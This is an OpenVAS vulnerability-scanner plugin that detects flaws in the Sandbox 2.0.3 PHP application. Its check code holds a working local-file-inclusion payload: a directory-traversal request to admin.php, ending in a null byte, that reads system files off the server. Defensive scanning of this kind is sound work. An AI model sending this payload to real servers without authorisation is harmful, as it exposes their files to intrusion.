###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sandbox_41420.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Sandbox Multiple Remote Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Sandbox is prone to multiple remote vulnerabilities, including
multiple SQL-injection vulnerabilities, a local file-include
vulnerability, and multiple arbitrary-file-upload vulnerabilities.

Exploiting these issues could allow an attacker to upload and execute
arbitrary code within the context of the webserver, compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database. Other attacks are also possible.

Sandbox 2.0.3 is vulnerable; prior versions may also be affected.";

tag_solution = "Updates are available; please see the references for more information.";

if(description)
{
 script_id(100707);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-07-08 14:00:46 +0200 (Thu, 08 Jul 2010)");
 script_bugtraq_id(41420);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Sandbox Multiple Remote Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41420");
 script_xref(name : "URL" , value : "http://www.iguanadons.net/sandbox");
 script_xref(name : "URL" , value : "http://www.iguanadons.net/downloads/Sandbox-204-56.html");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/sandbox", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );
  if( buf == NULL )continue;

  if( "Powered by Sandbox" >< buf ) {

    foreach file (keys(files)) {

      url = string(dir, "/admin.php?a=../../../../../../../../../../../../../../",files[file],"%00");

      if(http_vuln_check(port:port, url:url,pattern:file)) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );